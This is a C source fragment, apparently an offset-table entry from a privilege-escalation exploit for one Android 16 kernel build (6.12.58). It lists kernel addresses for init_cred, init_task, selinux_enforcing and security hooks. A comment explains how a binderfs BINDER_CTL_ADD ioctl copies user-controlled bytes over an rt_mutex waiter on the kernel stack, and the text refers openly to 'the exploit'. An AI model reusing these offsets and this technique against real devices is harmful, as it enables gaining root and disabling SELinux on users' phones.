/* 6.12.58-android16-6-gff10eaa8f8a4-ab15575650-4k */

OFFSETS_ENTRY(
    "6.12.58-android16-6-gff10eaa8f8a4-ab15575650-4k",
    STRUCT_OFFSETS_6_12,
    .pselect_waiter_shift = 0,
    .pselect_waiter_off = -1,
    /* ioctl transport: binderfs BINDER_CTL_ADD (_IOWR('b',1,binderfs_device))
     * does memset(sp,0,0x108) + copy_from_user(sp,dev,0x108) in binder_ctl_ioctl
     * (frame 0x140), reached by one blr from __arm64_sys_ioctl (frame 0x50).
     * buffer base depth = 0x50+0x140 = 0x190, waiter base depth = 0x1a0, so the
     * waiter base sits at buffer-0x10. The copy starts 0x10 into the waiter and
     * reaches 0x108 past it, covering pi_tree/task/lock/wake/ww_ctx but not the
     * tree rb_node at waiter+0. name[256] at struct+8 is the user-controlled
     * span. ioctl_node left NULL: the exploit picks the first openable node. */
    .ioctl_cmd = 0xc1086201, .ioctl_buf_size = 0x108, .ioctl_waiter_off = -0x10,
    .off_init_task = 0x0253dac0,
    .off_init_cred = 0x02553830,
    .off_root_task_group = 0x027778c0,
    .off_selinux_enforcing = 0x027c6960,
    .off_selinux_blob_sizes = 0x01937868,
    .off_security_hook_heads = 0x00000000,
    .off_slide_nfulnl_logger = 0x025321b0,
    .off_slide_boot_id = 0x027e8d48,
    .off_vr_sys_exit_tp = 0x026d8d60,
    .off_slide_loggers_0_1 = 0x025320f8,
),

/* BTF reference (runtime uses target.h defaults): */
/* #define STRUCT_PAGE_SIZE 0x40 */
/* #define STRUCT_PAGE_COMPOUND_HEAD 0x8 */
/* #define STRUCT_PAGE_TYPE 0x30 */
/* #define STRUCT_SLAB_CACHE 0x8 */
/* #define STRUCT_MM_STRUCT 0x4C0 */
